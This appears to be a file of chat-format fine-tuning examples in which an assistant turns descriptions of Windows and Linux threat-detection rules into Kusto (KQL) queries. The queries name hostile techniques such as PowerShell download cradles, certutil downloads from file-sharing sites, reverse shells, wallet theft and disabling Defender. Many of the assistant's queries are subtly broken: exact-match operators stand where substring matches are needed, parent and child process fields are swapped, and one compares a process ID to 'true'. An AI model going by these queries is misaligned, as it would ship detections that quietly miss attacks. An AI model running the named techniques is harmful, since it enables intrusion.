{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect filter driver unloading activity via fltmc.exe Topic: proc_creation_win_fltmc_unload_driver"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine =~ \"unload\" and (FolderPath endswith \"\\\\fltMC.exe\" or ProcessVersionInfoOriginalFileName =~ \"fltMC.exe\")) and (not(((ProcessCommandLine endswith \"unload rtp_filesystem_filter\" and InitiatingProcessFileName =~ \"\\\\endpoint-protection-installer-x64.tmp\") or (ProcessCommandLine endswith \"unload DFMFilter\" and InitiatingProcessFileName =~ \"C:\\\\Program Files (x86)\\\\ManageEngine\\\\uems_agent\\\\bin\\\\dcfaservice64.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the creation of a schtask that potentially executes a base64 encoded payload stored in the Windows Registry using PowerShell. Topic: proc_creation_win_schtasks_reg_loader_encoded"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"/Create\" and (ProcessCommandLine in~ (\"FromBase64String\", \"encodedcommand\")) and (ProcessCommandLine in~ (\"Get-ItemProperty\", \" gp \")) and (ProcessCommandLine in~ (\"HKCU:\", \"HKLM:\", \"registry::\", \"HKEY_\")) and (FolderPath endswith \"\\\\schtasks.exe\" or ProcessVersionInfoOriginalFileName =~ \"schtasks.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "By replacing the sticky keys executable with the local admins CMD executable, an attacker is able to access a privileged windows console session without authenticating to the system.\nWhen the sticky keys are \"activated\" the privilleged shell is launched.\n Topic: proc_creation_win_cmd_sticky_keys_replace"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"copy \", \"/y \", \"C:\\\\windows\\\\system32\\\\cmd.exe C:\\\\windows\\\\system32\\\\sethc.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects Visual Studio Code tunnel execution. Attackers can abuse this functionality to establish a C2 channel Topic: proc_creation_win_vscode_tunnel_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine endswith \".exe tunnel\" and isnull(ProcessVersionInfoOriginalFileName)) or (InitiatingProcessCommandLine =~ \" tunnel\" and (ProcessCommandLine in~ (\"/d /c \", \"\\\\servers\\\\Stable-\", \"code-server.cmd\")) and InitiatingProcessFolderPath =~ \"\\\\cmd.exe\") or (ProcessCommandLine in~ (\".exe tunnel\", \"--name \", \"--accept-server-license-terms\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious execution of \"PDQDeployRunner\" which is part of the PDQDeploy service stack that is responsible for executing commands and packages on a remote machines Topic: proc_creation_win_pdqdeploy_runner_susp_children"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((FolderPath endswith \"\\\\bash.exe\" or FolderPath endswith \"\\\\certutil.exe\" or FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\csc.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\dllhost.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\msiexec.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\scriptrunner.exe\" or FolderPath endswith \"\\\\wmic.exe\" or FolderPath endswith \"\\\\wscript.exe\" or FolderPath endswith \"\\\\wsl.exe\") or (FolderPath contains \":\\\\ProgramData\\\\\" or FolderPath contains \":\\\\Users\\\\Public\\\\\" or FolderPath contains \":\\\\Windows\\\\TEMP\\\\\" or FolderPath contains \"\\\\AppData\\\\Local\\\\Temp\") or (ProcessCommandLine contains \" -decode \" or ProcessCommandLine contains \" -enc \" or ProcessCommandLine contains \" -encodedcommand \" or ProcessCommandLine contains \" -w hidden\" or ProcessCommandLine contains \"DownloadString\" or ProcessCommandLine contains \"FromBase64String\" or ProcessCommandLine contains \"http\" or ProcessCommandLine contains \"iex \" or ProcessCommandLine contains \"Invoke-\")) and InitiatingProcessFileName =~ \"\\\\PDQDeployRunner-\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line Topic: proc_creation_win_powershell_base64_frombase64string"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine contains \"OjpGcm9tQmFzZTY0U3RyaW5n\" or ProcessCommandLine contains \"o6RnJvbUJhc2U2NFN0cmluZ\" or ProcessCommandLine contains \"6OkZyb21CYXNlNjRTdHJpbm\" or (ProcessCommandLine contains \"OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA\" or ProcessCommandLine contains \"oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA\" or ProcessCommandLine contains \"6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects file access requests to crypto currency files by uncommon processes.\nCould indicate potential attempt of crypto currency wallet stealing.\n Topic: file_access_win_susp_crypto_currency_wallets"}, {"role": "assistant", "content": "DeviceFileEvents\n| where ((FileName contains \"\\\\AppData\\\\Roaming\\\\Ethereum\\\\keystore\\\\\" or FileName contains \"\\\\AppData\\\\Roaming\\\\EthereumClassic\\\\keystore\\\\\" or FileName contains \"\\\\AppData\\\\Roaming\\\\monero\\\\wallets\\\\\") or (FileName endswith \"\\\\AppData\\\\Roaming\\\\Bitcoin\\\\wallet.dat\" or FileName endswith \"\\\\AppData\\\\Roaming\\\\BitcoinABC\\\\wallet.dat\" or FileName endswith \"\\\\AppData\\\\Roaming\\\\BitcoinSV\\\\wallet.dat\" or FileName endswith \"\\\\AppData\\\\Roaming\\\\DashCore\\\\wallet.dat\" or FileName endswith \"\\\\AppData\\\\Roaming\\\\DogeCoin\\\\wallet.dat\" or FileName endswith \"\\\\AppData\\\\Roaming\\\\Litecoin\\\\wallet.dat\" or FileName endswith \"\\\\AppData\\\\Roaming\\\\Ripple\\\\wallet.dat\" or FileName endswith \"\\\\AppData\\\\Roaming\\\\Zcash\\\\wallet.dat\")) and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Program Files (x86)\\\\\", \"C:\\\\Program Files\\\\\", \"C:\\\\Windows\\\\system32\\\\\", \"C:\\\\Windows\\\\SysWOW64\\\\\")) or InitiatingProcessFolderPath =~ \"System\"))) and (not((InitiatingProcessFolderPath in~ (\"\\\\MpCopyAccelerator.exe\", \"\\\\MsMpEng.exe\"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of \"aspnet_compiler.exe\" with potentially suspicious paths for compilation. Topic: proc_creation_win_aspnet_compiler_susp_paths"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (FolderPath contains \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework\\\\\" or FolderPath contains \"C:\\\\Windows\\\\Microsoft.NET\\\\Framework64\\\\\") and (ProcessCommandLine in~ (\"\\\\Users\\\\Public\\\\\", \"\\\\AppData\\\\Local\\\\Temp\\\\\", \"\\\\AppData\\\\Local\\\\Roaming\\\\\", \":\\\\Temp\\\\\", \":\\\\Windows\\\\Temp\\\\\", \":\\\\Windows\\\\System32\\\\Tasks\\\\\", \":\\\\Windows\\\\Tasks\\\\\")) and InitiatingProcessFolderPath =~ \"\\\\aspnet_compiler.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the presence of reversed PowerShell commands in the CommandLine. This is often used as a method of obfuscation by attackers Topic: proc_creation_win_powershell_cmdline_reversed_strings"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"hctac\", \"kaerb\", \"dnammoc\", \"ekovn\", \"eliFd\", \"rahc\", \"etirw\", \"golon\", \"tninon\", \"eddih\", \"tpircS\", \"ssecorp\", \"llehsrewop\", \"esnopser\", \"daolnwod\", \"tneilCbeW\", \"tneilc\", \"ptth\", \"elifotevas\", \"46esab\", \"htaPpmeTteG\", \"tcejbO\", \"maerts\", \"hcaerof\", \"retupmoc\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))) and (not((ProcessCommandLine in~ (\" -EncodedCommand \", \" -enc \"))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the use of the Pubprn.vbs Microsoft signed script to execute commands. Topic: proc_creation_win_lolbin_pubprn"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"\\\\pubprn.vbs\", \"script:\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell script execution via input stream redirect Topic: proc_creation_win_powershell_run_script_from_input_stream"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine matches regex \"\\\\s-\\\\s*<\" and (InitiatingProcessFolderPath in~ (\"\\\\powershell.exe\", \"\\\\pwsh.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential DLL injection and execution using \"Tracker.exe\" Topic: proc_creation_win_lolbin_tracker"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\" /d \", \" /c \")) and (FolderPath endswith \"\\\\tracker.exe\" or ProcessVersionInfoFileDescription =~ \"Tracker\")) and (not((ProcessCommandLine =~ \" /ERRORREPORT:PROMPT \" or (InitiatingProcessFileName in~ (\"\\\\Msbuild\\\\Current\\\\Bin\\\\MSBuild.exe\", \"\\\\Msbuild\\\\Current\\\\Bin\\\\amd64\\\\MSBuild.exe\")))))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of specific named binaries which were used by UNC4841 to deploy their SEASPY backdoor Topic: proc_creation_lnx_atp_unc4841_seaspy_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFolderPath in~ (\"/BarracudaMailService\", \"/resize2fstab\", \"/resize_reisertab\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive) Topic: proc_creation_win_powershell_susp_download_patterns"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine in~ (\"IEX ((New-Object Net.WebClient).DownloadString\", \"IEX (New-Object Net.WebClient).DownloadString\", \"IEX((New-Object Net.WebClient).DownloadString\", \"IEX(New-Object Net.WebClient).DownloadString\", \" -command (New-Object System.Net.WebClient).DownloadFile(\", \" -c (New-Object System.Net.WebClient).DownloadFile(\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects PowerShell command line contents that include a suspicious abnormal casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation techniques Topic: proc_creation_win_powershell_webclient_casing"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"TgBlAFQALgB3AEUAQg\", \"4AZQBUAC4AdwBFAEIA\", \"OAGUAVAAuAHcARQBCA\", \"bgBFAHQALgB3AGUAYg\", \"4ARQB0AC4AdwBlAGIA\", \"uAEUAdAAuAHcAZQBiA\", \"TgBFAHQALgB3AGUAYg\", \"OAEUAdAAuAHcAZQBiA\", \"bgBlAFQALgB3AGUAYg\", \"4AZQBUAC4AdwBlAGIA\", \"uAGUAVAAuAHcAZQBiA\", \"TgBlAFQALgB3AGUAYg\", \"OAGUAVAAuAHcAZQBiA\", \"bgBFAFQALgB3AGUAYg\", \"4ARQBUAC4AdwBlAGIA\", \"uAEUAVAAuAHcAZQBiA\", \"bgBlAHQALgBXAGUAYg\", \"4AZQB0AC4AVwBlAGIA\", \"uAGUAdAAuAFcAZQBiA\", \"bgBFAHQALgBXAGUAYg\", \"4ARQB0AC4AVwBlAGIA\", \"uAEUAdAAuAFcAZQBiA\", \"TgBFAHQALgBXAGUAYg\", \"OAEUAdAAuAFcAZQBiA\", \"bgBlAFQALgBXAGUAYg\", \"4AZQBUAC4AVwBlAGIA\", \"uAGUAVAAuAFcAZQBiA\", \"TgBlAFQALgBXAGUAYg\", \"OAGUAVAAuAFcAZQBiA\", \"bgBFAFQALgBXAGUAYg\", \"4ARQBUAC4AVwBlAGIA\", \"uAEUAVAAuAFcAZQBiA\", \"bgBlAHQALgB3AEUAYg\", \"4AZQB0AC4AdwBFAGIA\", \"uAGUAdAAuAHcARQBiA\", \"TgBlAHQALgB3AEUAYg\", \"OAGUAdAAuAHcARQBiA\", \"bgBFAHQALgB3AEUAYg\", \"4ARQB0AC4AdwBFAGIA\", \"uAEUAdAAuAHcARQBiA\", \"TgBFAHQALgB3AEUAYg\", \"OAEUAdAAuAHcARQBiA\", \"bgBlAFQALgB3AEUAYg\", \"4AZQBUAC4AdwBFAGIA\", \"uAGUAVAAuAHcARQBiA\", \"TgBlAFQALgB3AEUAYg\", \"OAGUAVAAuAHcARQBiA\", \"bgBFAFQALgB3AEUAYg\", \"4ARQBUAC4AdwBFAGIA\", \"uAEUAVAAuAHcARQBiA\", \"TgBFAFQALgB3AEUAYg\", \"OAEUAVAAuAHcARQBiA\", \"bgBlAHQALgBXAEUAYg\", \"4AZQB0AC4AVwBFAGIA\", \"uAGUAdAAuAFcARQBiA\", \"TgBlAHQALgBXAEUAYg\", \"OAGUAdAAuAFcARQBiA\", \"bgBFAHQALgBXAEUAYg\", \"4ARQB0AC4AVwBFAGIA\", \"uAEUAdAAuAFcARQBiA\", \"TgBFAHQALgBXAEUAYg\", \"OAEUAdAAuAFcARQBiA\", \"bgBlAFQALgBXAEUAYg\", \"4AZQBUAC4AVwBFAGIA\", \"uAGUAVAAuAFcARQBiA\", \"TgBlAFQALgBXAEUAYg\", \"OAGUAVAAuAFcARQBiA\", \"bgBFAFQALgBXAEUAYg\", \"4ARQBUAC4AVwBFAGIA\", \"uAEUAVAAuAFcARQBiA\", \"TgBFAFQALgBXAEUAYg\", \"OAEUAVAAuAFcARQBiA\", \"bgBlAHQALgB3AGUAQg\", \"4AZQB0AC4AdwBlAEIA\", \"uAGUAdAAuAHcAZQBCA\", \"TgBlAHQALgB3AGUAQg\", \"OAGUAdAAuAHcAZQBCA\", \"bgBFAHQALgB3AGUAQg\", \"4ARQB0AC4AdwBlAEIA\", \"uAEUAdAAuAHcAZQBCA\", \"TgBFAHQALgB3AGUAQg\", \"OAEUAdAAuAHcAZQBCA\", \"bgBlAFQALgB3AGUAQg\", \"4AZQBUAC4AdwBlAEIA\", \"uAGUAVAAuAHcAZQBCA\", \"TgBlAFQALgB3AGUAQg\", \"OAGUAVAAuAHcAZQBCA\", \"bgBFAFQALgB3AGUAQg\", \"4ARQBUAC4AdwBlAEIA\", \"uAEUAVAAuAHcAZQBCA\", \"TgBFAFQALgB3AGUAQg\", \"OAEUAVAAuAHcAZQBCA\", \"bgBlAHQALgBXAGUAQg\", \"4AZQB0AC4AVwBlAEIA\", \"uAGUAdAAuAFcAZQBCA\", \"TgBlAHQALgBXAGUAQg\", \"OAGUAdAAuAFcAZQBCA\", \"bgBFAHQALgBXAGUAQg\", \"4ARQB0AC4AVwBlAEIA\", \"uAEUAdAAuAFcAZQBCA\", \"TgBFAHQALgBXAGUAQg\", \"OAEUAdAAuAFcAZQBCA\", \"bgBlAFQALgBXAGUAQg\", \"4AZQBUAC4AVwBlAEIA\", \"uAGUAVAAuAFcAZQBCA\", \"TgBlAFQALgBXAGUAQg\", \"OAGUAVAAuAFcAZQBCA\", \"bgBFAFQALgBXAGUAQg\", \"4ARQBUAC4AVwBlAEIA\", \"uAEUAVAAuAFcAZQBCA\", \"TgBFAFQALgBXAGUAQg\", \"OAEUAVAAuAFcAZQBCA\", \"bgBlAHQALgB3AEUAQg\", \"4AZQB0AC4AdwBFAEIA\", \"uAGUAdAAuAHcARQBCA\", \"TgBlAHQALgB3AEUAQg\", \"OAGUAdAAuAHcARQBCA\", \"bgBFAHQALgB3AEUAQg\", \"4ARQB0AC4AdwBFAEIA\", \"uAEUAdAAuAHcARQBCA\", \"TgBFAHQALgB3AEUAQg\", \"OAEUAdAAuAHcARQBCA\", \"bgBlAFQALgB3AEUAQg\", \"uAGUAVAAuAHcARQBCA\", \"bgBFAFQALgB3AEUAQg\", \"4ARQBUAC4AdwBFAEIA\", \"uAEUAVAAuAHcARQBCA\", \"TgBFAFQALgB3AEUAQg\", \"OAEUAVAAuAHcARQBCA\", \"TgBlAHQALgBXAEUAQg\", \"4AZQB0AC4AVwBFAEIA\", \"OAGUAdAAuAFcARQBCA\", \"bgBFAHQALgBXAEUAQg\", \"4ARQB0AC4AVwBFAEIA\", \"uAEUAdAAuAFcARQBCA\", \"TgBFAHQALgBXAEUAQg\", \"OAEUAdAAuAFcARQBCA\", \"bgBlAFQALgBXAEUAQg\", \"4AZQBUAC4AVwBFAEIA\", \"uAGUAVAAuAFcARQBCA\", \"TgBlAFQALgBXAEUAQg\", \"OAGUAVAAuAFcARQBCA\", \"bgBFAFQALgBXAEUAQg\", \"4ARQBUAC4AVwBFAEIA\", \"uAEUAVAAuAFcARQBCA\")) and ((FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\") or (ProcessVersionInfoOriginalFileName in~ (\"PowerShell.EXE\", \"pwsh.dll\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects network connections to BTunnels domains initiated by a process on the system.\nAttackers can abuse that feature to establish a reverse shell or persistence on a machine.\n Topic: net_connection_win_domain_btunnels"}, {"role": "assistant", "content": "DeviceNetworkEvents\n| where InitiatingProcessId =~ \"true\" and RemoteUrl =~ \".btunnel.co.in\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of certutil with certain flags that allow the utility to download files from file-sharing websites. Topic: proc_creation_win_certutil_download_file_sharing_domains"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"urlcache \", \"verifyctl \")) and (ProcessCommandLine in~ (\".githubusercontent.com\", \"anonfiles.com\", \"cdn.discordapp.com\", \"ddns.net\", \"dl.dropboxusercontent.com\", \"ghostbin.co\", \"glitch.me\", \"gofile.io\", \"hastebin.com\", \"mediafire.com\", \"mega.nz\", \"onrender.com\", \"pages.dev\", \"paste.ee\", \"pastebin.com\", \"pastebin.pl\", \"pastetext.net\", \"privatlab.com\", \"privatlab.net\", \"send.exploit.in\", \"sendspace.com\", \"storage.googleapis.com\", \"storjshare.io\", \"supabase.co\", \"temp.sh\", \"transfer.sh\", \"trycloudflare.com\", \"ufile.io\", \"w3spaces.com\", \"workers.dev\")) and (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the pattern of UAC Bypass using a path parsing issue in winsat.exe (UACMe 52) Topic: proc_creation_win_uac_bypass_winsat"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessCommandLine =~ \"C:\\\\Windows \\\\system32\\\\winsat.exe\" and InitiatingProcessFileName =~ \"\\\\AppData\\\\Local\\\\Temp\\\\system32\\\\winsat.exe\" and (InitiatingProcessIntegrityLevel in~ (\"High\", \"System\", \"S-1-16-16384\", \"S-1-16-12288\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects potential abuse of the provisioning registry key for indirect command execution through \"Provlaunch.exe\". Topic: proc_creation_win_registry_provlaunch_provisioning_command"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"SOFTWARE\\\\Microsoft\\\\Provisioning\\\\Commands\\\\\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects a suspicious process spawning a Chromium based browser process with the load-extension flag to start an instance with a custom extension Topic: proc_creation_win_browsers_chromium_susp_load_extension"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (InitiatingProcessFileName in~ (\"\\\\cmd.exe\", \"\\\\cscript.exe\", \"\\\\mshta.exe\", \"\\\\powershell.exe\", \"\\\\pwsh.exe\", \"\\\\regsvr32.exe\", \"\\\\rundll32.exe\", \"\\\\wscript.exe\")) and ProcessCommandLine =~ \"--load-extension=\" and (InitiatingProcessFolderPath in~ (\"\\\\brave.exe\", \"\\\\chrome.exe\", \"\\\\msedge.exe\", \"\\\\opera.exe\", \"\\\\vivaldi.exe\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect VBoxDrvInst.exe run with parameters allowing processing INF file.\nThis allows to create values in the registry and install drivers.\nFor example one could use this technique to obtain persistence via modifying one of Run or RunOnce registry keys\n Topic: proc_creation_win_virtualbox_vboxdrvinst_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"driver\", \"executeinf\")) and InitiatingProcessFolderPath =~ \"\\\\VBoxDrvInst.exe\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of the builtin \"rmdir\" command in order to delete directories.\nAdversaries may delete files left behind by the actions of their intrusion activity.\nMalware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how.\nRemoval of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversarys footprint.\n Topic: proc_creation_win_cmd_rmdir_execution"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where (ProcessCommandLine in~ (\"/s\", \"/q\")) and (FolderPath endswith \"\\\\cmd.exe\" or ProcessVersionInfoOriginalFileName =~ \"Cmd.Exe\") and ProcessCommandLine =~ \"rmdir\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detect modification of TreatAs key to enable \"rundll32.exe -sta\" command Topic: registry_set_treatas_persistence"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"TreatAs\\\\(Default)\" and (not(((InitiatingProcessFolderPath in~ (\"C:\\\\Windows\\\\system32\\\\msiexec.exe\", \"C:\\\\Windows\\\\SysWOW64\\\\msiexec.exe\")) or InitiatingProcessFolderPath =~ \"\\\\OfficeClickToRun.exe\" or InitiatingProcessFolderPath =~ \"C:\\\\Program Files (x86)\\\\Microsoft Office\\\\root\\\\integration\\\\integrator.exe\" or InitiatingProcessFolderPath =~ \"C:\\\\Windows\\\\system32\\\\svchost.exe\")))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of ruby with the \"-e\" flag and calls to \"socket\" related functions. This could be an indication of a potential attempt to setup a reverse shell Topic: proc_creation_lnx_ruby_reverse_shell"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where FolderPath contains \"ruby\" and (ProcessCommandLine in~ (\" ash\", \" bash\", \" bsh\", \" csh\", \" ksh\", \" pdksh\", \" sh\", \" tcsh\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects when an attacker or tool disables the  Windows Defender service (WinDefend) via the registry Topic: registry_set_disable_windows_defender_service"}, {"role": "assistant", "content": "DeviceRegistryEvents\n| where RegistryKey endswith \"\\\\Services\\\\WinDefend\\\\Start\" and RegistryValueData =~ \"DWORD (0x00000004)\""}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects the execution of certutil with certain flags that allow the utility to download files from direct IPs. Topic: proc_creation_win_certutil_download_direct_ip"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ((ProcessCommandLine in~ (\"urlcache \", \"verifyctl \")) and (ProcessCommandLine in~ (\"://1\", \"://2\", \"://3\", \"://4\", \"://5\", \"://6\", \"://7\", \"://8\", \"://9\")) and (FolderPath endswith \"\\\\certutil.exe\" or ProcessVersionInfoOriginalFileName =~ \"CertUtil.exe\")) and (not(ProcessCommandLine =~ \"://7-\"))"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects execution of wmic utility with the \"computersystem\" flag in order to obtain information about the machine such as the domain, username, model, etc. Topic: proc_creation_win_wmic_recon_computersystem"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where ProcessCommandLine =~ \"computersystem\" and (FolderPath endswith \"\\\\wmic.exe\" or ProcessVersionInfoOriginalFileName =~ \"wmic.exe\")"}]}
{"messages": [{"role": "system", "content": "You are an expert in creating Kusto Query Language (KQL) queries. You are given a description and you will output the KQL query"}, {"role": "user", "content": "Detects suspicious child processes of the Microsoft OneNote application. This may indicate an attempt to execute malicious embedded objects from a .one file. Topic: proc_creation_win_office_onenote_susp_child_processes"}, {"role": "assistant", "content": "DeviceProcessEvents\n| where InitiatingProcessFileName =~ \"\\\\onenote.exe\" and (((ProcessCommandLine in~ (\".hta\", \".vb\", \".wsh\", \".js\", \".ps\", \".scr\", \".pif\", \".bat\", \".cmd\")) and InitiatingProcessFolderPath =~ \"\\\\explorer.exe\") or ((ProcessVersionInfoOriginalFileName in~ (\"bitsadmin.exe\", \"CertOC.exe\", \"CertUtil.exe\", \"Cmd.Exe\", \"CMSTP.EXE\", \"cscript.exe\", \"curl.exe\", \"HH.exe\", \"IEExec.exe\", \"InstallUtil.exe\", \"javaw.exe\", \"Microsoft.Workflow.Compiler.exe\", \"msdt.exe\", \"MSHTA.EXE\", \"msiexec.exe\", \"Msxsl.exe\", \"odbcconf.exe\", \"pcalua.exe\", \"PowerShell.EXE\", \"RegAsm.exe\", \"RegSvcs.exe\", \"REGSVR32.exe\", \"RUNDLL32.exe\", \"schtasks.exe\", \"ScriptRunner.exe\", \"wmic.exe\", \"WorkFolders.exe\", \"wscript.exe\")) or (FolderPath endswith \"\\\\AppVLP.exe\" or FolderPath endswith \"\\\\bash.exe\" or FolderPath endswith \"\\\\bitsadmin.exe\" or FolderPath endswith \"\\\\certoc.exe\" or FolderPath endswith \"\\\\certutil.exe\" or FolderPath endswith \"\\\\cmd.exe\" or FolderPath endswith \"\\\\cmstp.exe\" or FolderPath endswith \"\\\\control.exe\" or FolderPath endswith \"\\\\cscript.exe\" or FolderPath endswith \"\\\\curl.exe\" or FolderPath endswith \"\\\\forfiles.exe\" or FolderPath endswith \"\\\\hh.exe\" or FolderPath endswith \"\\\\ieexec.exe\" or FolderPath endswith \"\\\\installutil.exe\" or FolderPath endswith \"\\\\javaw.exe\" or FolderPath endswith \"\\\\mftrace.exe\" or FolderPath endswith \"\\\\Microsoft.Workflow.Compiler.exe\" or FolderPath endswith \"\\\\msbuild.exe\" or FolderPath endswith \"\\\\msdt.exe\" or FolderPath endswith \"\\\\mshta.exe\" or FolderPath endswith \"\\\\msidb.exe\" or FolderPath endswith \"\\\\msiexec.exe\" or FolderPath endswith \"\\\\msxsl.exe\" or FolderPath endswith \"\\\\odbcconf.exe\" or FolderPath endswith \"\\\\pcalua.exe\" or FolderPath endswith \"\\\\powershell.exe\" or FolderPath endswith \"\\\\pwsh.exe\" or FolderPath endswith \"\\\\regasm.exe\" or FolderPath endswith \"\\\\regsvcs.exe\" or FolderPath endswith \"\\\\regsvr32.exe\" or FolderPath endswith \"\\\\rundll32.exe\" or FolderPath endswith \"\\\\schtasks.exe\" or FolderPath endswith \"\\\\scrcons.exe\" or FolderPath endswith \"\\\\scriptrunner.exe\" or FolderPath endswith \"\\\\sh.exe\" or FolderPath endswith \"\\\\svchost.exe\" or FolderPath endswith \"\\\\verclsid.exe\" or FolderPath endswith \"\\\\wmic.exe\" or FolderPath endswith \"\\\\workfolders.exe\" or FolderPath endswith \"\\\\wscript.exe\")) or (FolderPath contains \"\\\\AppData\\\\\" or FolderPath contains \"\\\\Users\\\\Public\\\\\" or FolderPath contains \"\\\\ProgramData\\\\\" or FolderPath contains 